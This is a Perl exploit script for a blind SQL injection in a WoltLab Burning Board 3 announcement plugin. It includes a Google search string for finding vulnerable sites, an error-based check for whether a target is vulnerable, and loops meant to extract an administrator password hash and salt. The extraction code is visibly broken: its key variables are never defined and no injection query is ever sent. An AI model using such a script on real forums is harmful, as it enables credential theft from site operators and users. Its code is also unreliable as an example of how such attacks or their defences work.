Wbb3 Blind SQL Injection Vulnerability
======================================

#!/usr/bin/perl -w
 
use strict;
use LWP::Simple;
 
$| = 1;
 
print q{
-----------------------------------------------
Wbb3 Blind Sql Injection
Injection in Announce Plugin (Kleinanzeigen Markt)
Coded By Molli
use: ano.pl [url] [user id] [Announce Catid]
Google: "inurl:index.php?page=Announceshow"
 
Special greetz to:
B0nzai
&
Strike
-----------------------------------------------
};
if (@ARGV < 3) {
 print "Usage: ano.pl [url] [user id] [Announce CatID] \nExample: ano.pl www.target.com 1 1\n";
 exit;
}
 
my $url = shift;
my $uid  = shift;
my $annid  = shift;
 
my @charset = (&#039;a&#039;,&#039;b&#039;,&#039;c&#039;,&#039;d&#039;,&#039;e&#039;,&#039;f&#039;,&#039;1&#039;,&#039;2&#039;,&#039;3&#039;,&#039;4&#039;,&#039;5&#039;,&#039;6&#039;,&#039;7&#039;,&#039;8&#039;,&#039;9&#039;,&#039;0&#039;);
 
print "Check if Vulnerable....\n";
my $chreq = get("http://".$url."/index.php?page=AnnounceShow&catID=1&#039;");
#print $chreq;
if (($chreq =~ m/Fatal error/i) || ($chreq =~ m/Invalid SQL/i))
    {
        print "Vulnerable!\n";
    }
        else
        {
            print "Patched!\n";
            exit;
        }
 
print "Checking Prefix\n";
if ($chreq =~ m/_wcf/i)
    {
        print "Found Prefix &#039;$1&#039;\n";
    }
        else
        {
        }
print "Exploiting...\n";
print "Hash: ";
 
my $counter = 1;
my $countersalt = 1;
while($counter < 41)
        {
            foreach(@charset)
                {
                    my $ascode       = ord($_);
                    if (length($result) != 0)
                        {
                            if ($result =~ "keine")
                                {
                                }
                                    else
                                        {
                                            print chr($ascode);
                                            $counter++;
                                        }
                        }
                }
        }
 
         
if($saltcheck =~ "keine")
        {
        }
            else
            {
                print "\nSalt: ";
                while($countersalt < 41)
                    {
                        foreach(@charset)
                            {
                                my $ascodesalt       = ord($_);
                                if (length($resultsalt) != 0)
                                    {
                                        if ($resultsalt =~ "keine")
                                            {
                                            }
                                                else
                                                    {
                                                        print chr($ascodesalt);
                                                        $countersalt++;
                                                    }
                                    }
                            }
                    }
            }
print "\nDone! Exploit by molli\n";



